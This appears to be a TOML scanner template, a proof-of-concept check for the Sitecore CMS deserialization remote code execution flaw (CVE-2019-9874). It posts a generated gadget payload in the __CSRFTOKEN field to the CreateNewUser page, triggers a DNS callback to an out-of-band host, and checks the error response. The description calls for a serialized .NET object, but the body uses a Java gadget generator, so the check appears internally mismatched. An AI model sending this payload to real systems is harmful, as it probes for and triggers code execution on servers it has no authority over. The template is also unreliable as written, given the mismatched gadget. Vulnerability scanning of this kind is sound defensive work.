[info]
author = "ave"
description = "验证 Sitecore Security.AntiCSRF 模块反序列化漏洞，通过在 POST 参数 __CSRFTOKEN 中发送恶意序列化 .NET 对象触发反序列化，观察服务器返回异常信息"
id = "POC-AVE-2019-1685"
name = "Sitecore CMS 反序列化远程代码执行漏洞 PoC"
severity = "critical"
tags = ["ave-2019-1685"]
vuln_id = [
    "CVE-2019-9874",
    "AVE-2019-1685",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx"
protocol = "http"

[poc.requests.body]
content = '__CSRFTOKEN={{generate_java_gadget("dns", "https://{{interactsh-url}}", "base64")}}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Cookie = "__CSRFCOOKIE={{randstr}};"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["PotentialCsrfException"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["deserialization"]

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
